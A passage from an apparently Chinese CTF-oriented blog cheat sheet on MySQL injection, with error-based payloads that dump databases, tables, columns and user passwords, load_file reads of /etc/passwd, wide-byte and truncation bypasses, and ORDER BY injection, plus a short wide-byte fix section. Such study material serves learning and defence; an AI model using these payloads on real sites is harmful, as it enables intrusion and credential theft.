</ul>
<h4 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h4><p>当执行以下语句时会报错(主键冲突)</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) x <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>主要利用floor(rand(0)*2)的结果规律为0 1 1 0 1 1，当数据表中最少需要三条数据才会报错</p>
<p>floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</p>
</blockquote>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">#也可以简化成</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>));</span><br><span class="line">#关键表被过滤时</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">!</span><span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br><span class="line">#rand被过滤 适用用户变量</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(password,<span class="variable">@a</span>:<span class="operator">=</span>(<span class="variable">@a</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">%</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> ( <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;|&#x27;</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a;</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.hackblog.cn<span class="operator">/</span>sql.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span></span><br><span class="line">concat(<span class="number">0x7e</span>,schema_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line">爆表</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;|&#x27;</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line">爆字段</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘users’ limit <span class="number">0</span>,<span class="number">1</span>),’<span class="operator">|</span>’,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line">爆数据</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> concat(name,’<span class="operator">|</span>’,passwd,’<span class="operator">|</span>’,birth) <span class="keyword">from</span> users limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>),’<span class="operator">|</span>’,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> concat(<span class="number">0x23</span>,name,<span class="number">0x3a</span>,passwd,<span class="number">0x23</span>) <span class="keyword">FROM</span> users limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">3</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br></pre></td></tr></table></figure></div>

<p>几何函数 </p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GeometryCollection：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> GeometryCollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span><span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">polygon()：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">multipoint()：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">multilinestring()：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">linestring()：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">multipolygon() ：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure></div>

<p>不存在函数</p>
<blockquote>
<p>爆数据库</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032231655.jpg"
                      alt="image-20220708181105742"
                ><figcaption>image-20220708181105742</figcaption></figure></p>
</blockquote>
<p>name_const()</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取版本信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> name_const(version(),<span class="number">0x1</span>),name_const(version(),<span class="number">0x1</span>))a;</span><br><span class="line"># <span class="number">1060</span> <span class="operator">-</span> Duplicate <span class="keyword">column</span> name <span class="string">&#x27;8.0.27&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>uuid相关函数</p>
<p>mysql:8.0.x</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> UUID_TO_BIN((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>));</span><br><span class="line"># <span class="number">1146</span> <span class="operator">-</span> <span class="keyword">Table</span> <span class="string">&#x27;test.users&#x27;</span> doesn<span class="string">&#x27;t exist</span></span><br><span class="line"><span class="string">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</span></span><br><span class="line"><span class="string"># 1146 - Table &#x27;</span>test.users<span class="string">&#x27; doesn&#x27;</span>t exist</span><br></pre></td></tr></table></figure></div>

<p>exp() 适用版本 5.5.5-5.5.49</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">USER</span>())a));</span><br><span class="line"><span class="comment">--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。</span></span><br><span class="line"><span class="comment">--double 数值类型超出范围</span></span><br><span class="line"><span class="comment">--Exp()为以e 为底的对数函数；</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span></span><br><span class="line"></span><br><span class="line">如果是在适用版本之外：虽然也会报错，但是表名不会出来</span><br><span class="line"><span class="keyword">select</span> <span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)<span class="operator">-</span><span class="operator">~</span><span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>exp报错<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509124.html" >（转载）使用exp进行SQL报错注入 - lcamry - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>pow()结合盲注</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> pow(<span class="number">1</span><span class="operator">+</span>(表达式),<span class="number">999999999999</span>)</span><br><span class="line"># 表达式可以是盲注的形式，返回<span class="number">1</span>或者<span class="number">0</span>，通过报错将字符猜出来，报错回显的表达式是返回<span class="number">1</span>的</span><br><span class="line"># 同样方式用在exp上(临界值为<span class="number">709</span>)</span><br><span class="line"><span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span>(表达式))</span><br></pre></td></tr></table></figure></div>

<p>bigint 溢出文章<a class="link"   target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509112.html" >http://www.cnblogs.com/lcamry/articles/5509112.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;?id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x) <span class="operator">-</span> <span class="operator">~</span><span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h3 id="xpath语法错误–较常用"><a href="#xpath语法错误–较常用" class="headerlink" title="xpath语法错误–较常用"></a>xpath语法错误–较常用</h3><p>报错原因，0x7e就是~不属于xpath语法格式</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>));</span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"># 适用版本: <span class="number">5.1</span><span class="number">.5</span><span class="operator">+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>updatexml三个参数</p>
<ul>
<li><p>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1</p>
</li>
<li><p>第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。</p>
</li>
<li><p>第三个参数：new_value，String 格式，替换查找到的符合条件的数据**</p>
</li>
</ul>
<p>注意加select防止不回显，当显示字符有限时，常用字符串截断substr配合</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>))x;</span><br><span class="line"><span class="comment">--mysql 重复特性，此处重复了version，所以报错。</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="Join-using-注列名"><a href="#Join-using-注列名" class="headerlink" title="Join using()注列名"></a>Join using()注列名</h3><p>mysql8修复</p>
<p>报错存在重复的列名</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b)c; # 报错信息内回显第一列名称</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b <span class="keyword">using</span>(username))c;# 第二列</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b <span class="keyword">using</span>(username,password))c;# 第三列</span><br></pre></td></tr></table></figure></div>

<h3 id="GTID相关函数"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数</h3><p>版本&gt;&#x3D;5.6.5</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subset(<span class="keyword">user</span>(),<span class="number">1</span>); # 报错回显用户</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subset(hex(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit</span><br><span class="line"><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>);</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subtract((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a),<span class="number">1</span>); # 报错回显用户</span><br></pre></td></tr></table></figure></div>

<h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><h3 id="查看限制"><a href="#查看限制" class="headerlink" title="查看限制"></a>查看限制</h3><p>secure_file_priv</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032232760.jpg"
                      alt="image-20220708190755416"
                ><figcaption>image-20220708190755416</figcaption></figure></p>
<h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>load_file(filename)</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032232156.jpg"
                      alt="image-20220708190902690"
                ><figcaption>image-20220708190902690</figcaption></figure></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">convert</span>(load_file(&quot;/etc/passwd&quot;) <span class="keyword">using</span> utf8);</span><br></pre></td></tr></table></figure></div>

<p>详见<a class="link"   target="_blank" rel="noopener" href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" >SQL注入总结 – cc (ccship.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="常见思路-1"><a href="#常见思路-1" class="headerlink" title="常见思路"></a>常见思路</h3><p>如果是单引号闭合</p>
<p>注册一个<code>admin&#39;#</code>账户，登录修改其密码，则实际改的是admin的密码</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p>
<p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><ul>
<li><p><strong>addslashes()</strong> ：这个函数在预定义字符之前添加反斜杠 \ 。预定义字符： 单引号 ‘ 、双引号 ” 、反斜杠 \ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。</p>
<blockquote>
<p>这个函数功能与魔术引号功能完全相同，如果魔术引号打开就不要用这个函数了</p>
</blockquote>
</li>
<li><p>三个魔术引号功能</p>
<blockquote>
<ol>
<li><p>magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。如果 magic_quotes_gpc 关闭时返回 0，开启时返回 1。在 PHP 5.4.0 起将始终返回 0，因为这个魔术引号功能已经从 PHP 中移除了。</p>
</li>
<li><p>magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。</p>
</li>
<li><p>magic_quotes_sybase (魔术引号开关)如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ”。而双引号、反斜线 和 NULL 字符将不会进行转义。</p>
</li>
</ol>
</blockquote>
</li>
</ul>
<h3 id="gbk编码"><a href="#gbk编码" class="headerlink" title="gbk编码"></a>gbk编码</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户名输入：admin<span class="operator">%</span>df<span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">转义后为： admin%df\&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"><span class="keyword">SET</span> character_set_client <span class="operator">=</span><span class="string">&#x27;gbk&#x27;</span>后：admin運<span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">执行语句：... where username=&#x27;</span>admin運<span class="string">&#x27; or 1=1#&#x27;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>%df</code>吃掉<code>\</code>的原因是，<code>urlencode(\&#39;)</code>&#x3D;<code>%5c%27</code> ,添加%df后形成<code>%df%5c%27</code>,而上面提到的mysql 在GBK 编码方式的，第一位范围为0x00-0x7F时，当作一个字符。%df不在这个范围内，因此会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27(‘) 则作为一个单独的符号在外面，同时也就达到了我们的目的</p>
</blockquote>
<h3 id="utf8编码、Latin1编码"><a href="#utf8编码、Latin1编码" class="headerlink" title="utf8编码、Latin1编码"></a>utf8编码、Latin1编码</h3><p>UTF-8编码是变长编码，可能有1~4个字节表示： </p>
<ul>
<li>一字节时范围是<code>[00-7F] </code></li>
<li>两字节时范围是<code>[C0-DF][80-BF]</code> </li>
<li>三字节时范围是<code>[E0-EF][80-BF][80-BF]</code> </li>
<li>四字节时范围是<code>[F0-F7][80-BF][80-BF][80-BF]</code></li>
</ul>
<blockquote>
<p>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中, 所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。</p>
</blockquote>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：?username<span class="operator">=</span>admin<span class="operator">%</span>c2</span><br><span class="line"><span class="operator">%</span>c2是Latin1字符集不存在的字符，<span class="operator">%</span><span class="number">00</span><span class="operator">-</span><span class="operator">%</span><span class="number">7</span>F可以直接表示某个字符、<span class="operator">%</span>C2<span class="operator">-</span><span class="operator">%</span>F4不可以直接表示某个字符而只是其他长字节编码结果的首字节。对于不完整的长字节UTF<span class="number">-8</span>编码的字符，进行字符集转换时会直接忽略，所以admin<span class="operator">%</span>c2会变成admin</span><br></pre></td></tr></table></figure></div>

<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul>
<li><p>在调用 <strong>mysql_real_escape_string()</strong> 函数之前，先设置连接所使用的字符集为GBK ，<strong>mysql_set_charset&#x3D;(‘gbk’,$conn)</strong> 。</p>
</li>
<li><p>所以防止宽字节注入的另一个方法就是将 <strong>character_set_client</strong> 设置为binary(二进制)。需要在所有的sql语句前指定连接的形式是binary二进制：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>当我们的MySQL收到客户端的请求数据后，会认为他的编码是character_set_client所对应的编码，也就是二进制。然后再将它转换成character_set_connection所对应的编码。然后进入具体表和字段后，再转换成字段对应的编码。当查询结果产生后，会从表和字段的编码转换成character_set_results所对应的编码，返回给客户端。所以，当我们将character_set_client编码设置成了binary，就不存在宽字节注入的问题了，所有的数据都是以二进制的形式传递。</p>
</blockquote>
</li>
</ul>
<h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>当数据库字符串长度过短，并且后端没有对字符串进行长度限制时</p>
<p>select 语句对于参数后面空格的处理是删除，insert只是截取最大长度的字符串，然后插入数据库。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users(</span><br><span class="line">	username <span class="type">varchar</span>(<span class="number">25</span>),</span><br><span class="line">  password <span class="type">varchar</span>(<span class="number">25</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>最大长度限制(具体看表的定义)为25 我们输入用户名为 admin[20个空格]1,密码随意。脚本查询的时候因为用了select 语句，空格被删除，剩下了admin1。</p>
<p>注册时：INSERT取前25位-&gt;admin[20个空格]和自己设定的密码当成了一个新用户-&gt;select查找admin，返回两条</p>
<blockquote>
<p>数据库里面的空格也在查询的时候被删除了再比较</p>
</blockquote>
<h2 id="order-by-后的注入"><a href="#order-by-后的注入" class="headerlink" title="order by 后的注入"></a>order by 后的注入</h2><h3 id="order-by参数后注入"><a href="#order-by参数后注入" class="headerlink" title="order by参数后注入"></a>order by参数后注入</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];  </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>sort可以是sql语句，只要保证返回一行一列或者是一个数字或布尔类型也可以,一般有以下三种</p>
<ul>
<li><p>直接注入语句（要返回单行单列） ?sort&#x3D;(select ……)</p>
</li>
<li><p>利用函数rand ?sort&#x3D;rand(sql语句)</p>
<ul>
<li>利用的是rand(true)与rand(false)导致题目回显不同而构造盲注条件</li>
</ul>
<p>也可以用报错注入</p>
